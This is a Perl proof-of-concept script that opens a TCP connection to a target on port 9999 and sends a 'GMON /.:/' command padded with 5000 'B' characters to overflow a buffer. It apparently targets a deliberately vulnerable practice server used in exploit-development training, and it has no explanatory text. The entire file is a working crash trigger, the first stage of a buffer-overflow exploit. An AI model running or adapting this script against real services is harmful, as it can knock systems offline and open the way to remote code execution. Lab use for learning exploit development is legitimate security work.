#!/usr/bin/perl
use IO::Socket;

$ipAddr = "192.168.8.103";
$ipPort = "9999";

if ($ARGV[1] ne '')
{
  $ipAddr = "$ARGV[0]";
  $ipPort = "$ARGV[1]";
}

$command = "GMON /.:/";
$command .= "B" x 5000;

$socket = IO::Socket::INET->new(
  Proto=>"tcp",
  PeerAddr=>$ipAddr,
  PeerPort=>$ipPort) or die "Cannot connect to $ipAddr $ipPort";

$socket->recv($returnedData, 1024);
print $returnedData;

$socket->send($command);
